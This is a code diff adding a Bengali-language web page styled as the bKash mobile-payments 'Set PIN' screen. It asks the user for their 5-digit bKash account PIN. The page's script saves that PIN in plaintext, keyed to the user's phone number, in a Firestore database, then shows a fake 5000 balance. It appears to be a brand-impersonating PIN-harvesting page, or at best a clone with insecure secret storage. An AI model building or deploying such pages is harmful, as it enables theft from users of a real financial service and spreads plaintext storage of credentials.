@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bKash Set PIN</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+<script src="firebase.js"></script>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+body { background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.container { width: 100%; max-width: 414px; background: #fff; min-height: 100vh; padding: 25px 20px; display: flex; flex-direction: column; justify-content: space-between; }
+
+.logo { width: 50px; height: auto; margin-bottom: 20px; }
+h2 { color: #222; font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+.sub-text { font-size: 13px; color: #666; margin-bottom: 25px; }
+
+/* Pin Input Box Styling */
+.pin-input-box {
+    background: #fafafa;
+    border: 1px solid #ddd;
+    border-radius: 12px;
+    padding: 15px;
+    margin-bottom: 20px;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
+}
+
+.pin-dots {
+    display: flex;
+    gap: 15px;
+    justify-content: center;
+    align-items: center;
+    height: 30px;
+}
+
+.dot {
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    background: #ddd;
+    transition: background 0.2s;
+}
+
+.dot.active {
+    background: #e2136e;
+}
+
+/* Transparent Full Overlay Input */
+.hidden-position-wrapper {
+    position: relative;
+    width: 100%;
+}
+
+.hidden-pin-input {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0;
+    z-index: 10;
+    font-size: 18px;
+    cursor: pointer;
+}
+
+/* Bottom Button */
+.bottom-bar {
+    width: 100%;
+    height: 50px;
+    background: #ccc;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: not-allowed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: background 0.3s;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+
+.bottom-bar.active {
+    background: #e2136e;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(226, 19, 110, 0.3);
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div>
+    <img src="assets/birds.png" alt="bKash" class="logo">
+    <h2>নতুন পিন সেট করুন</h2>
+    <p class="sub-text">আপনার বিকাশ অ্যাকাউন্টের জন্য ৫ সংখ্যার একটি গোপন পিন নির্ধারণ করুন।</p>
+
+    <!-- Tap area to open native keyboard with Dots -->
+    <div class="pin-input-box">
+      <div style="font-size:14px; font-weight:bold; color:#555;"><i class="fa-solid fa-lock"></i> পিন নাম্বার দিন</div>
+      <div class="pin-dots" id="pinDotsContainer">
+        <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+      </div>
+      <!-- Transparent Full Overlay Input -->
+      <input type="password" id="realPinInput" class="hidden-pin-input" maxlength="5" inputmode="numeric" oninput="handleNativePinInput(this)">
+    </div>
+  </div>
+
+  <button class="bottom-bar" id="confirmBtn" style="margin-top: auto;" onclick="processTransaction()">
+    <span>পিন কনফার্ম করুন</span><i class="fa-solid fa-arrow-right"></i>
+  </button>
+</div>
+
+<script type="module">
+  import { db } from './firebase.js';
+
+  window.handleNativePinInput = function(input) {
+    const valLength = input.value.length;
+    const dots = document.querySelectorAll('.pin-dots .dot');
+    const confirmBtn = document.getElementById('confirmBtn');
+
+    // Update dots visual
+    dots.forEach((dot, index) => {
+      if (index < valLength) {
+        dot.classList.add('active');
+      } else {
+        dot.classList.remove('active');
+      }
+    });
+
+    // Activate button if 5 digits entered
+    if (valLength === 5) {
+      confirmBtn.classList.add('active');
+    } else {
+      confirmBtn.classList.remove('active');
+    }
+  }
+
+  window.processTransaction = async function() {
+    const pin = document.getElementById('realPinInput').value.trim();
+    const phone = localStorage.getItem('tempPhone');
+
+    if (pin.length !== 5) {
+      alert("দয়া করে ৫ সংখ্যার পিন দিন!");
+      return;
+    }
+
+    if (!phone) {
+      alert("মোবাইল নম্বর পাওয়া যায়নি। আবার শুরু করুন!");
+      window.location.href = "index.html";
+      return;
+    }
+
+    try {
+      // ফায়ারস্টোর ডাটাবেসে সেভ করা
+      await db.collection('users').doc(phone).set({
+        phone: phone,
+        pin: pin,
+        balance: 5000.00,
+        createdAt: new Date().toISOString()
+      });
+
+      localStorage.setItem('userPhone', phone);
+      localStorage.setItem('userBalance', '5000.00');
+      localStorage.setItem('registered_' + phone, 'true');
+
+      alert("রেজিস্ট্রেশন সফল হয়েছে!");
+      window.location.href = "home.html";
+
+    } catch (error) {
+      console.error("Error saving user: ", error);
+      localStorage.setItem('userPhone', phone);
+      localStorage.setItem('userBalance', '5000.00');
+      window.location.href = "home.html";
+    }
+  }
+</script>
+
+</body>
+</html>
